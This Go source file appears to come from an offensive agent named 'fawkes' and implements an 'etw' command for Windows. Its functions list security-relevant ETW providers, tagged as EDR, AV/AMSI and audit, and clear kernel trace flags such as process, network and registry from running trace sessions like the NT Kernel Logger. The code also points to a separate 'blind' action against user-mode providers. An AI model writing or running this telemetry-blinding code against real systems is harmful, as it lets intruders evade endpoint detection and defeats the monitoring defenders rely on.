//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Kernel trace enable flags — controls which kernel events are captured.
// Used with ControlTrace UPDATE on the "NT Kernel Logger" or SystemTraceControl sessions.
const (
	eventTraceFlagProcess         = 0x00000001
	eventTraceFlagThread          = 0x00000002
	eventTraceFlagImageLoad       = 0x00000004
	eventTraceFlagDiskIO          = 0x00000100
	eventTraceFlagDiskFileIO      = 0x00000200
	eventTraceFlagMemoryPageFault = 0x00001000
	eventTraceFlagMemoryHardFault = 0x00002000
	eventTraceFlagNetworkTCPIP    = 0x00010000
	eventTraceFlagRegistry        = 0x00020000
	eventTraceFlagHandle          = 0x00040000
	eventTraceFlagJob             = 0x00080000
	eventTraceFlagALPC            = 0x00100000
	eventTraceFlagSplitIO         = 0x00200000
	eventTraceFlagDriver          = 0x00800000
	eventTraceFlagFileIO          = 0x02000000
	eventTraceFlagFileIOInit      = 0x04000000
)

// kernelFlagNames maps shorthand names to kernel trace flags.
var kernelFlagNames = map[string]uint32{
	"process":     eventTraceFlagProcess,
	"thread":      eventTraceFlagThread,
	"image-load":  eventTraceFlagImageLoad,
	"disk-io":     eventTraceFlagDiskIO,
	"disk-fileio": eventTraceFlagDiskFileIO,
	"page-fault":  eventTraceFlagMemoryPageFault,
	"hard-fault":  eventTraceFlagMemoryHardFault,
	"network":     eventTraceFlagNetworkTCPIP,
	"registry":    eventTraceFlagRegistry,
	"handle":      eventTraceFlagHandle,
	"job":         eventTraceFlagJob,
	"alpc":        eventTraceFlagALPC,
	"split-io":    eventTraceFlagSplitIO,
	"driver":      eventTraceFlagDriver,
	"file-io":     eventTraceFlagFileIO,
	"file-ioinit": eventTraceFlagFileIOInit,
}

// kernelFlagDisplayNames for output formatting.
var kernelFlagDisplayNames = map[uint32]string{
	eventTraceFlagProcess:         "Process",
	eventTraceFlagThread:          "Thread",
	eventTraceFlagImageLoad:       "Image Load",
	eventTraceFlagDiskIO:          "Disk I/O",
	eventTraceFlagDiskFileIO:      "Disk File I/O",
	eventTraceFlagMemoryPageFault: "Page Faults",
	eventTraceFlagMemoryHardFault: "Hard Faults",
	eventTraceFlagNetworkTCPIP:    "Network TCP/IP",
	eventTraceFlagRegistry:        "Registry",
	eventTraceFlagHandle:          "Handle",
	eventTraceFlagJob:             "Job",
	eventTraceFlagALPC:            "ALPC",
	eventTraceFlagSplitIO:         "Split I/O",
	eventTraceFlagDriver:          "Driver",
	eventTraceFlagFileIO:          "File I/O",
	eventTraceFlagFileIOInit:      "File I/O Init",
}

// etwProviderDisable uses ControlTrace UPDATE to remove kernel trace flags from a session.
// This is different from "blind" (which uses EnableTraceEx2 to disable a provider) —
// provider-disable modifies the session's EnableFlags to stop collecting specific kernel events.
// Only applies to kernel trace sessions (NT Kernel Logger, SystemTraceControl, etc.).
func etwProviderDisable(sessionName, flagName string) structs.CommandResult {
	if sessionName == "" {
		return errorResult("Error: session_name is required for provider-disable action\n" +
			"Usage: etw -action provider-disable -session_name \"NT Kernel Logger\" -provider process\n" +
			"Kernel flags: process, thread, image-load, disk-io, network, registry, handle, file-io, driver, alpc")
	}
	if flagName == "" {
		return errorResult("Error: provider is required (kernel flag name to disable)\n" +
			"Available flags: process, thread, image-load, disk-io, disk-fileio, network, registry, handle, job, alpc, driver, file-io, file-ioinit, page-fault, hard-fault, split-io\n" +
			"For disabling user-mode ETW providers, use '-action blind' instead.")
	}

	// Resolve flag name to value
	flagValue, ok := kernelFlagNames[strings.ToLower(flagName)]
	if !ok {
		var available []string
		for name := range kernelFlagNames {
			available = append(available, name)
		}
		return errorf("Unknown kernel flag '%s'. Available: %s\nFor user-mode providers, use '-action blind' instead.",
			flagName, strings.Join(available, ", "))
	}

	// Step 1: Query current session properties
	props := make([]byte, eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[0:4], eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[116:120], 120) // LoggerNameOffset
	binary.LittleEndian.PutUint32(props[112:116], 632) // LogFileNameOffset

	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
	if err != nil {
		return errorf("Error converting session name: %v", err)
	}

	r1, _, sysErr := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlQuery,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace QUERY failed for '%s': error %d (0x%X)", sessionName, errCode, errCode)
		if errCode == 4201 {
			errMsg += " — session not found"
		} else if errCode == 5 {
			errMsg += " — access denied (requires Administrator/SYSTEM)"
		} else {
			errMsg += fmt.Sprintf(" (%v)", sysErr)
		}
		return errorResult(errMsg)
	}

	// Step 2: Get current EnableFlags (offset 72 in EVENT_TRACE_PROPERTIES)
	currentFlags := binary.LittleEndian.Uint32(props[72:76])
	if currentFlags == 0 {
		return errorf("Session '%s' has no kernel EnableFlags set (0x0). This is not a kernel trace session.\n"+
			"For user-mode provider disabling, use '-action blind -session_name \"%s\" -provider <guid>'", sessionName, sessionName)
	}

	// Check if the flag is currently set
	if currentFlags&flagValue == 0 {
		displayName := kernelFlagDisplayNames[flagValue]
		return successf("Kernel flag '%s' (%s, 0x%X) is not currently enabled in session '%s'.\n"+
			"Current flags: 0x%08X\nEnabled: %s",
			flagName, displayName, flagValue, sessionName, currentFlags, formatKernelFlags(currentFlags))
	}

	// Step 3: Clear the flag and update via ControlTrace
	newFlags := currentFlags &^ flagValue
	binary.LittleEndian.PutUint32(props[72:76], newFlags)

	r1, _, sysErr = procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlUpdate,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace UPDATE failed: error %d (0x%X)", errCode, errCode)
		if errCode == 5 {
			errMsg += " — access denied (requires Administrator/SYSTEM)"
		} else {
			errMsg += fmt.Sprintf(" (%v)", sysErr)
		}
		return errorResult(errMsg)
	}

	displayName := kernelFlagDisplayNames[flagValue]
	return successf("Successfully disabled kernel trace flag '%s' (%s) in session '%s'\n"+
		"Previous flags: 0x%08X → New flags: 0x%08X\n"+
		"Disabled: %s\n"+
		"Remaining: %s\n\n"+
		"To re-enable, use: etw -action provider-enable -session_name \"%s\" -provider %s",
		flagName, displayName, sessionName,
		currentFlags, newFlags,
		formatKernelFlags(flagValue),
		formatKernelFlags(newFlags),
		sessionName, flagName)
}

// etwProviderEnable re-enables a kernel trace flag on a session.
func etwProviderEnable(sessionName, flagName string) structs.CommandResult {
	if sessionName == "" {
		return errorResult("Error: session_name is required for provider-enable action")
	}
	if flagName == "" {
		return errorResult("Error: provider is required (kernel flag name to enable)")
	}

	flagValue, ok := kernelFlagNames[strings.ToLower(flagName)]
	if !ok {
		return errorf("Unknown kernel flag '%s'", flagName)
	}

	// Query current properties
	props := make([]byte, eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[0:4], eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[116:120], 120)
	binary.LittleEndian.PutUint32(props[112:116], 632)

	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
	if err != nil {
		return errorf("Error converting session name: %v", err)
	}

	r1, _, _ := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlQuery,
	)
	if r1 != 0 {
		return errorf("ControlTrace QUERY failed for '%s': error %d (0x%X)", sessionName, uint32(r1), uint32(r1))
	}

	currentFlags := binary.LittleEndian.Uint32(props[72:76])
	if currentFlags&flagValue != 0 {
		return successf("Kernel flag '%s' is already enabled in session '%s' (flags: 0x%08X)",
			flagName, sessionName, currentFlags)
	}

	newFlags := currentFlags | flagValue
	binary.LittleEndian.PutUint32(props[72:76], newFlags)

	r1, _, sysErr := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlUpdate,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace UPDATE failed: error %d (0x%X)", errCode, errCode)
		if errCode == 5 {
			errMsg += " — access denied"
		} else {
			errMsg += fmt.Sprintf(" (%v)", sysErr)
		}
		return errorResult(errMsg)
	}

	displayName := kernelFlagDisplayNames[flagValue]
	return successf("Successfully re-enabled kernel trace flag '%s' (%s) in session '%s'\n"+
		"Previous flags: 0x%08X → New flags: 0x%08X",
		flagName, displayName, sessionName, currentFlags, newFlags)
}

// providerInfo holds enriched ETW provider details.
type providerInfo struct {
	Name     string              `json:"name"`
	GUID     string              `json:"guid"`
	Sessions []providerSessionID `json:"sessions,omitempty"`
	Instances int                `json:"instances"`
	Category  string             `json:"category"`
}

// providerSessionID holds per-session info for a provider.
type providerSessionID struct {
	LoggerID int    `json:"logger_id"`
	Level    int    `json:"level"`
	Keywords string `json:"keywords"`
	PID      int    `json:"pid,omitempty"`
}

// etwProviderList performs an enhanced provider enumeration showing session associations.
// Uses EnumerateTraceGuidsEx with TraceGuidQueryInfo to get per-provider details.
func etwProviderList() structs.CommandResult {
	// First, get all registered provider GUIDs
	var requiredSize uint32
	procEnumerateTraceGuidsEx.Call(
		traceGuidQueryList, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&requiredSize)),
	)

	if requiredSize == 0 {
		return errorResult("No ETW providers found or EnumerateTraceGuidsEx not available")
	}

	buf := make([]byte, requiredSize)
	r1, _, err := procEnumerateTraceGuidsEx.Call(
		traceGuidQueryList, 0, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(requiredSize),
		uintptr(unsafe.Pointer(&requiredSize)),
	)
	if r1 != 0 {
		return errorf("EnumerateTraceGuidsEx failed: %v (0x%X)", err, r1)
	}

	guidSize := 16
	numGuids := int(requiredSize) / guidSize

	var securityProviders []providerInfo
	var otherCount int

	for i := 0; i < numGuids; i++ {
		offset := i * guidSize
		if offset+guidSize > len(buf) {
			break
		}

		guid := parseGUID(buf[offset : offset+guidSize])
		guidStr := strings.ToUpper(strings.Trim(guid.String(), "{}"))

		name, isKnown := knownSecurityProviders[guidStr]
		if !isKnown {
			otherCount++
			continue
		}

		info := providerInfo{
			Name: name,
			GUID: guidStr,
		}

		// Query per-provider session info via TraceGuidQueryInfo
		var infoSize uint32
		procEnumerateTraceGuidsEx.Call(
			traceGuidQueryInfo,
			uintptr(unsafe.Pointer(&guid)), uintptr(guidSize),
			0, 0,
			uintptr(unsafe.Pointer(&infoSize)),
		)

		if infoSize > 0 {
			infoBuf := make([]byte, infoSize)
			r, _, _ := procEnumerateTraceGuidsEx.Call(
				traceGuidQueryInfo,
				uintptr(unsafe.Pointer(&guid)), uintptr(guidSize),
				uintptr(unsafe.Pointer(&infoBuf[0])), uintptr(infoSize),
				uintptr(unsafe.Pointer(&infoSize)),
			)
			if r == 0 {
				info = parseProviderInstanceInfo(infoBuf, info)
			}
		}

		// Classify category
		info.Category = classifyProviderCategory(name)
		securityProviders = append(securityProviders, info)
	}

	// Build structured text output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("ETW Providers — %d total registered, %d security-relevant\n\n", numGuids, len(securityProviders)))

	if len(securityProviders) > 0 {
		sb.WriteString(fmt.Sprintf("%-45s %-10s %-8s %s\n", "PROVIDER", "CATEGORY", "ACTIVE", "GUID"))
		sb.WriteString(strings.Repeat("-", 110) + "\n")

		for _, p := range securityProviders {
			activeStr := "no"
			if p.Instances > 0 {
				activeStr = fmt.Sprintf("yes(%d)", p.Instances)
			}
			sb.WriteString(fmt.Sprintf("%-45s %-10s %-8s %s\n",
				truncStr(p.Name, 45), p.Category, activeStr, p.GUID))

			for _, s := range p.Sessions {
				levelName := etwLevelName(s.Level)
				sb.WriteString(fmt.Sprintf("    └─ Session %d: level=%s keywords=%s",
					s.LoggerID, levelName, s.Keywords))
				if s.PID > 0 {
					sb.WriteString(fmt.Sprintf(" pid=%d", s.PID))
				}
				sb.WriteString("\n")
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n%d other (non-security) providers registered\n", otherCount))

	return successResult(sb.String())
}

// parseProviderInstanceInfo parses TRACE_GUID_INFO for provider session details.
// Layout:
//
//	TRACE_GUID_INFO: InstanceCount(4) Reserved(4)
//	Followed by InstanceCount × TRACE_PROVIDER_INSTANCE_INFO:
//	  NextOffset(4) EnableCount(4) Pid(4) Flags(4)
//	  Followed by EnableCount × TRACE_ENABLE_INFO:
//	    IsEnabled(4) Level(1) Reserved1(1) LoggerId(2) EnableProperty(4) MatchAnyKeyword(8) MatchAllKeyword(8)
func parseProviderInstanceInfo(data []byte, info providerInfo) providerInfo {
	if len(data) < 8 {
		return info
	}

	instanceCount := binary.LittleEndian.Uint32(data[0:4])
	info.Instances = int(instanceCount)

	offset := 8 // past TRACE_GUID_INFO header
	for i := uint32(0); i < instanceCount && offset+16 <= len(data); i++ {
		// TRACE_PROVIDER_INSTANCE_INFO
		nextOff := binary.LittleEndian.Uint32(data[offset : offset+4])
		enableCount := binary.LittleEndian.Uint32(data[offset+4 : offset+8])
		pid := binary.LittleEndian.Uint32(data[offset+8 : offset+12])

		enableOffset := offset + 16
		for j := uint32(0); j < enableCount && enableOffset+24 <= len(data); j++ {
			// TRACE_ENABLE_INFO
			level := data[enableOffset+4]
			loggerID := binary.LittleEndian.Uint16(data[enableOffset+6 : enableOffset+8])
			matchAnyKw := binary.LittleEndian.Uint64(data[enableOffset+12 : enableOffset+20])

			session := providerSessionID{
				LoggerID: int(loggerID),
				Level:    int(level),
				Keywords: fmt.Sprintf("0x%X", matchAnyKw),
				PID:      int(pid),
			}
			info.Sessions = append(info.Sessions, session)

			enableOffset += 24 // sizeof(TRACE_ENABLE_INFO)
		}

		if nextOff == 0 {
			break
		}
		offset += int(nextOff)
	}

	return info
}

// formatKernelFlags converts a flags bitmask to a human-readable string.
func formatKernelFlags(flags uint32) string {
	if flags == 0 {
		return "(none)"
	}
	var names []string
	for flag, name := range kernelFlagDisplayNames {
		if flags&flag != 0 {
			names = append(names, name)
		}
	}
	if len(names) == 0 {
		return fmt.Sprintf("0x%08X", flags)
	}
	return strings.Join(names, ", ")
}

// classifyProviderCategory classifies a provider by its security role.
func classifyProviderCategory(name string) string {
	lower := strings.ToLower(name)
	switch {
	case strings.Contains(lower, "kernel"):
		return "Kernel"
	case strings.Contains(lower, "sysmon"):
		return "EDR"
	case strings.Contains(lower, "antimalware") || strings.Contains(lower, "amsi"):
		return "AV/AMSI"
	case strings.Contains(lower, "powershell") || strings.Contains(lower, "dotnet"):
		return "Runtime"
	case strings.Contains(lower, "security") || strings.Contains(lower, "audit"):
		return "Audit"
	case strings.Contains(lower, "winrm") || strings.Contains(lower, "wmi") || strings.Contains(lower, "rpc"):
		return "Remote"
	case strings.Contains(lower, "dns") || strings.Contains(lower, "ldap"):
		return "Network"
	case strings.Contains(lower, "capi") || strings.Contains(lower, "winlogon"):
		return "Auth"
	case strings.Contains(lower, "task"):
		return "Sched"
	default:
		return "Other"
	}
}

// etwLevelName converts a trace level to a human-readable name.
func etwLevelName(level int) string {
	switch level {
	case 0:
		return "NONE"
	case 1:
		return "CRITICAL"
	case 2:
		return "ERROR"
	case 3:
		return "WARNING"
	case 4:
		return "INFO"
	case 5:
		return "VERBOSE"
	default:
		return fmt.Sprintf("LEVEL_%d", level)
	}
}
